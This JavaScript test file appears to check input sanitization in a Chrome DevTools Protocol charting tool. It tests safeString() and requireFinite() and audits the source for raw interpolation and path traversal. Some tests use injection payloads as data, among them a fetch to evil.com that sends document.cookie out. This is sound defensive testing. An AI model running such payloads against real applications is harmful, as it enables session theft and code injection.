/**
 * Tests for CDP input sanitization utilities and their integration across modules.
 * Covers safeString(), requireFinite(), source audit, and per-module validation.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { safeString, requireFinite } from '../src/connection.js';
import { setSymbol, setTimeframe, setType, manageIndicator, setVisibleRange } from '../src/core/chart.js';
import { drawShape } from '../src/core/drawing.js';

// ── Mock helpers ─────────────────────────────────────────────────────────

function mockEval() {
  const calls = [];
  const fn = async (expr) => { calls.push(expr); return undefined; };
  fn.calls = calls;
  return fn;
}

function mockDeps(overrides = {}) {
  const evaluate = mockEval();
  return {
    _deps: {
      evaluate,
      evaluateAsync: evaluate,
      waitForChartReady: async () => true,
      getChartApi: async () => 'window.__api',
      ...overrides,
    },
    evaluate,
  };
}

// ── safeString() ─────────────────────────────────────────────────────────

describe('safeString() — CDP injection prevention', () => {
  it('wraps normal strings in double quotes', () => {
    assert.equal(safeString('hello'), '"hello"');
  });

  it('wraps in double quotes so single quotes are safe', () => {
    assert.equal(safeString("test'injection"), '"test\'injection"');
  });

  it('escapes double quotes', () => {
    assert.equal(safeString('test"injection'), '"test\\"injection"');
  });

  it('neutralizes template literals by wrapping in double quotes', () => {
    const parsed = JSON.parse(safeString('${alert(1)}'));
    assert.equal(parsed, '${alert(1)}');
  });

  it('escapes backslashes', () => {
    assert.equal(safeString('test\\injection'), '"test\\\\injection"');
  });

  it('escapes newlines and control chars', () => {
    const result = safeString('line1\nline2\r\ttab');
    assert.ok(!result.includes('\n'));
    assert.ok(result.includes('\\n'));
  });

  it('handles empty string', () => {
    assert.equal(safeString(''), '""');
  });

  it('coerces non-strings to strings', () => {
    assert.equal(safeString(123), '"123"');
    assert.equal(safeString(null), '"null"');
    assert.equal(safeString(undefined), '"undefined"');
  });

  it('prevents classic CDP injection payload', () => {
    const payload = "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
    const parsed = JSON.parse(safeString(payload));
    assert.equal(parsed, payload);
  });

  it('prevents template literal injection', () => {
    const payload = '`; process.exit(); `';
    const parsed = JSON.parse(safeString(payload));
    assert.equal(parsed, payload);
  });
});

// ── requireFinite() ──────────────────────────────────────────────────────

describe('requireFinite() — numeric validation', () => {
  it('passes finite numbers through', () => {
    assert.equal(requireFinite(42, 'test'), 42);
    assert.equal(requireFinite(3.14, 'test'), 3.14);
    assert.equal(requireFinite(-100, 'test'), -100);
    assert.equal(requireFinite(0, 'test'), 0);
  });

  it('coerces numeric strings', () => {
    assert.equal(requireFinite('42', 'test'), 42);
  });

  it('rejects NaN', () => {
    assert.throws(() => requireFinite(NaN, 'price'), /price must be a finite number/);
  });

  it('rejects Infinity', () => {
    assert.throws(() => requireFinite(Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => requireFinite(-Infinity, 'time'), /time must be a finite number/);
  });

  it('rejects non-numeric strings', () => {
    assert.throws(() => requireFinite('abc', 'value'), /value must be a finite number/);
  });

  it('coerces null to 0', () => {
    assert.equal(requireFinite(null, 'x'), 0);
  });

  it('rejects undefined', () => {
    assert.throws(() => requireFinite(undefined, 'x'), /x must be a finite number/);
  });

  it('includes bad value in error message', () => {
    assert.throws(() => requireFinite('oops', 'field'), /got: oops/);
  });
});

// ── chart.js — safeString in evaluate calls ──────────────────────────────

describe('chart.js — sanitized evaluate calls', () => {
  it('setSymbol uses safeString in evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await setSymbol({ symbol: "NYMEX:CL1!", _deps });
    const call = evaluate.calls.find(c => c.includes('setSymbol'));
    assert.ok(call, 'setSymbol called');
    assert.ok(call.includes('"NYMEX:CL1!"'), 'symbol wrapped in double quotes via safeString');
    assert.ok(!call.includes("'NYMEX:CL1!'"), 'no single-quoted interpolation');
  });

  it('setSymbol sanitizes injection payload', async () => {
    const { _deps, evaluate } = mockDeps();
    const payload = "'; alert('xss'); //";
    await setSymbol({ symbol: payload, _deps });
    const call = evaluate.calls.find(c => c.includes('setSymbol'));
    // Payload must be wrapped in JSON.stringify output — double-quoted, escaped
    // It should NOT appear as a bare unquoted string that could break out
    assert.ok(call.includes(safeString(payload)), 'payload is JSON-escaped in evaluate call');
    assert.ok(!call.includes(`setSymbol('`), 'no single-quoted interpolation');
  });

  it('setTimeframe uses safeString', async () => {
    const { _deps, evaluate } = mockDeps();
    await setTimeframe({ timeframe: '15', _deps });
    const call = evaluate.calls.find(c => c.includes('setResolution'));
    assert.ok(call.includes('"15"'), 'timeframe wrapped via safeString');
  });

  it('setType validates chart type range 0-9', async () => {
    const { _deps } = mockDeps();
    // Valid names
    for (const name of ['Candles', 'Line', 'Area', 'HeikinAshi']) {
      const r = await setType({ chart_type: name, _deps });
      assert.equal(r.success, true);
    }
    // Valid numbers
    for (const n of [0, 1, 5, 9]) {
      const r = await setType({ chart_type: String(n), _deps });
      assert.equal(r.success, true);
    }
  });

  it('setType rejects invalid chart types', async () => {
    const { _deps } = mockDeps();
    for (const bad of ['invalid', '10', '-1', '1.5', 'NaN']) {
      await assert.rejects(
        () => setType({ chart_type: bad, _deps }),
        /Unknown chart type/,
        `should reject chart_type="${bad}"`,
      );
    }
  });

  it('manageIndicator add uses safeString for indicator name', async () => {
    const { _deps, evaluate } = mockDeps();
    evaluate.calls.length = 0;
    // First evaluate call is getAllStudies (before), then createStudy, then getAllStudies (after)
    const evalFn = async (expr) => {
      evaluate.calls.push(expr);
      if (expr.includes('getAllStudies')) return ['id1'];
      return undefined;
    };
    _deps.evaluate = evalFn;
    await manageIndicator({ action: 'add', indicator: "Relative Strength Index", _deps });
    const createCall = evaluate.calls.find(c => c.includes('createStudy'));
    assert.ok(createCall, 'createStudy called');
    assert.ok(createCall.includes('"Relative Strength Index"'), 'indicator name via safeString');
  });

  it('manageIndicator remove uses safeString for entity_id', async () => {
    const { _deps, evaluate } = mockDeps();
    await manageIndicator({ action: 'remove', entity_id: "abc123", _deps });
    const call = evaluate.calls.find(c => c.includes('removeEntity'));
    assert.ok(call.includes('"abc123"'), 'entity_id via safeString');
  });

  it('setVisibleRange validates from/to with requireFinite', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => setVisibleRange({ from: NaN, to: 100, _deps }),
      /from must be a finite number/,
    );
    await assert.rejects(
      () => setVisibleRange({ from: 100, to: Infinity, _deps }),
      /to must be a finite number/,
    );
  });

  it('setVisibleRange passes valid numbers to evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await setVisibleRange({ from: 1700000000, to: 1700100000, _deps });
    const call = evaluate.calls.find(c => c.includes('zoomToBarsRange'));
    assert.ok(call, 'zoomToBarsRange called');
    assert.ok(call.includes('1700000000'), 'from value in call');
    assert.ok(call.includes('1700100000'), 'to value in call');
  });
});

// ── drawing.js — safeString + requireFinite ──────────────────────────────

describe('drawing.js — sanitized evaluate calls', () => {
  it('drawShape validates point coordinates with requireFinite', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawShape({ shape: 'horizontal_line', point: { time: NaN, price: 100 }, _deps }),
      /point\.time must be a finite number/,
    );
    await assert.rejects(
      () => drawShape({ shape: 'horizontal_line', point: { time: 100, price: Infinity }, _deps }),
      /point\.price must be a finite number/,
    );
  });

  it('drawShape validates point2 coordinates', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawShape({
        shape: 'trend_line',
        point: { time: 100, price: 50 },
        point2: { time: NaN, price: 60 },
        _deps,
      }),
      /point2\.time must be a finite number/,
    );
  });

  it('drawShape uses safeString for shape name', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({ shape: 'horizontal_line', point: { time: 100, price: 50 }, _deps });
    const call = evaluate.calls.find(c => c.includes('createShape'));
    assert.ok(call, 'createShape called');
    assert.ok(call.includes('"horizontal_line"'), 'shape name via safeString');
  });

  it('drawShape uses validated coordinates in evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({ shape: 'horizontal_line', point: { time: 1700000000, price: 5000.50 }, _deps });
    const call = evaluate.calls.find(c => c.includes('createShape'));
    assert.ok(call.includes('1700000000'), 'time in call');
    assert.ok(call.includes('5000.5'), 'price in call');
  });

  it('drawShape multipoint uses safeString and requireFinite', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({
      shape: 'trend_line',
      point: { time: 100, price: 50 },
      point2: { time: 200, price: 60 },
      _deps,
    });
    const call = evaluate.calls.find(c => c.includes('createMultipointShape'));
    assert.ok(call, 'createMultipointShape called');
    assert.ok(call.includes('"trend_line"'), 'shape name via safeString');
  });
});

// ── Source-level audit ───────────────────────────────────────────────────

describe('source audit — no unsafe interpolation patterns', () => {
  const CORE_DIR = new URL('../src/core/', import.meta.url).pathname;
  const coreFiles = readdirSync(CORE_DIR).filter(f => f.endsWith('.js'));

  for (const file of coreFiles) {
    it(`${file} has no .replace(/'/g) manual escaping`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      assert.ok(!source.includes(".replace(/'/g,"),
        `${file} still uses manual quote escaping — use safeString() instead`);
    });
  }

  const VULNERABLE_PATTERNS = [
    /evaluate\([^)]*'\$\{(?!CHART_API|CWC|rp|apiPath|colPath|CHART_COLLECTION)/,
  ];

  for (const file of coreFiles) {
    it(`${file} has no raw user input in evaluate() string literals`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      for (const pattern of VULNERABLE_PATTERNS) {
        assert.ok(!pattern.test(source),
          `${file} has raw interpolation in evaluate() — use safeString()`);
      }
    });
  }
});

// ── Path traversal prevention ────────────────────────────────────────────

describe('path traversal prevention', () => {
  it('capture.js strips path separators from filename', () => {
    const source = readFileSync(new URL('../src/core/capture.js', import.meta.url), 'utf8');
    assert.ok(source.includes(".replace(/[\\/\\\\]/g, '_')"));
  });

  it('batch.js strips path separators from filename', () => {
    const source = readFileSync(new URL('../src/core/batch.js', import.meta.url), 'utf8');
    assert.ok(source.includes(".replace(/[\\/\\\\]/g, '_')"));
  });
});

// ── Per-module sanitization audit ────────────────────────────────────────
// For each core module that accepts user input and passes it into a CDP
// `evaluate()` call, confirm the input flows through safeString/requireFinite
// (or JSON.stringify / Number coercion) rather than being concatenated raw.
// These are static source checks — they catch regressions even when the
// behavioral test suite can't exercise the live CDP path.

function readCore(name) {
  return readFileSync(new URL(`../src/core/${name}`, import.meta.url), 'utf8');
}

describe('data.js — user-input sanitization', () => {
  const src = readCore('data.js');

  it('getQuote escapes the symbol parameter via safeString', () => {
    // getQuote({ symbol }) → must pass through safeString
    assert.match(src, /safeString\(symbol \|\| ''\)/);
  });

  it('getIndicator escapes entity_id via safeString', () => {
    assert.match(src, /safeString\(entity_id\)/);
  });

  it('buildGraphicsJS escapes the filter string via safeString', () => {
    assert.match(src, /safeString\(filter \|\| ''\)/);
  });

  it('does not interpolate entity_id, symbol, or filter directly into evaluate()', () => {
    // No bare `${entity_id}` / `${symbol}` / `${filter}` inside template
    // literals (those would be unescaped user input).
    assert.ok(!/\$\{entity_id\}/.test(src), 'entity_id interpolated raw');
    assert.ok(!/\$\{symbol\}/.test(src), 'symbol interpolated raw');
    assert.ok(!/\$\{filter\}/.test(src), 'filter interpolated raw');
  });
});

describe('pine.js — user-input sanitization', () => {
  const src = readCore('pine.js');

  it('setSource escapes the source via JSON.stringify', () => {
    // JSON.stringify is equivalent to safeString for our purposes
    assert.match(src, /JSON\.stringify\(source\)/);
  });

  it('newScript escapes the template via JSON.stringify before interpolation', () => {
    assert.match(src, /JSON\.stringify\(template\)/);
  });

  it('openScript escapes the script name via JSON.stringify', () => {
    assert.match(src, /JSON\.stringify\(name\.toLowerCase\(\)\)/);
  });

  it('does not interpolate source, name, or type directly', () => {
    assert.ok(!/\$\{source\}/.test(src), 'source interpolated raw');
    assert.ok(!/\$\{name\}/.test(src), 'name interpolated raw');
    // `type` appears as a property name in templates; guard against raw user-value interpolation
    assert.ok(!/\$\{\s*type\s*\}/.test(src), 'type interpolated raw');
  });
});

describe('alerts.js — user-input sanitization', () => {
  const src = readCore('alerts.js');

  it('escapes price input via safeString', () => {
    assert.match(src, /safeString\(String\(price\)\)/);
  });

  it('escapes message input via JSON.stringify', () => {
    assert.match(src, /JSON\.stringify\(message\)/);
  });

  it('does not interpolate price or message directly', () => {
    assert.ok(!/\$\{price\}/.test(src), 'price interpolated raw');
    assert.ok(!/\$\{message\}/.test(src), 'message interpolated raw');
  });
});

describe('batch.js — user-input sanitization', () => {
  const src = readCore('batch.js');

  it('escapes symbol and timeframe via safeString', () => {
    assert.match(src, /safeString\(symbol\)/);
    assert.match(src, /safeString\(tf\)/);
  });

  it('does not interpolate symbol/tf directly', () => {
    assert.ok(!/setSymbol\(\$\{symbol\}/.test(src));
    assert.ok(!/setResolution\(\$\{tf\}/.test(src));
  });
});

describe('capture.js — filename safety', () => {
  const src = readCore('capture.js');

  it('never interpolates untrusted filename into evaluate()', () => {
    // capture.js writes to disk only — it should not pass `filename`
    // into any CDP evaluate expression.
    assert.ok(!/evaluate\([^)]*\$\{filename/.test(src));
  });
});

describe('core module audit — evaluate() usage hygiene', () => {
  // Every core module that takes user input AND calls evaluate() should
  // either import safeString/requireFinite or use JSON.stringify.
  // We flag any file that uses evaluate() with an unsafe pattern.
  const CORE_DIR = new URL('../src/core/', import.meta.url).pathname;
  const coreFiles = readdirSync(CORE_DIR).filter(f => f.endsWith('.js') && f !== 'index.js');

  // Known user-input parameter names — these should never appear as a bare
  // `${name}` interpolation inside an evaluate() template literal; they must
  // flow through safeString / JSON.stringify / requireFinite first.
  const USER_INPUT_PARAMS = [
    'symbol', 'symbols', 'entity_id', 'name', 'filter', 'study_filter',
    'source', 'query', 'panel', 'shape', 'message', 'condition',
    'date', 'selector', 'text',
  ];

  for (const file of coreFiles) {
    it(`${file} never embeds raw user-input params into evaluate()`, () => {
      const src = readFileSync(join(CORE_DIR, file), 'utf8');

      // Collect names that are locally sanitized within this file — safe to
      // interpolate even if they collide with a user-input name.
      // Treat a name as sanitized if its assignment expression (up to the
      // end-of-statement) contains a known sanitizer call. Covers ternaries
      // like `const x = a ? JSON.stringify(a) : 'null'`.
      const sanitized = new Set();
      const declRe = /(?:const|let|var)\s+(\w+)\s*=\s*([^;]+);/g;
      let decl;
      while ((decl = declRe.exec(src)) !== null) {
        const [, name, rhs] = decl;
        if (/\b(?:JSON\.stringify|safeString|requireFinite|Number|parseInt|parseFloat)\(/.test(rhs)) {
          sanitized.add(name);
        }
      }

      const re = /evaluate(?:Async)?\(`([^`]+)`/gs;
      const issues = [];
      let m;
      while ((m = re.exec(src)) !== null) {
        const body = m[1];
        for (const param of USER_INPUT_PARAMS) {
          if (sanitized.has(param)) continue;
          const pattern = new RegExp(`\\$\\{\\s*${param}\\s*\\}`);
          if (pattern.test(body)) issues.push(param);
        }
      }
      assert.deepEqual([...new Set(issues)], [],
        `${file} interpolates user-input params raw: ${issues.join(', ')} — wrap in safeString()`);
    });
  }
});
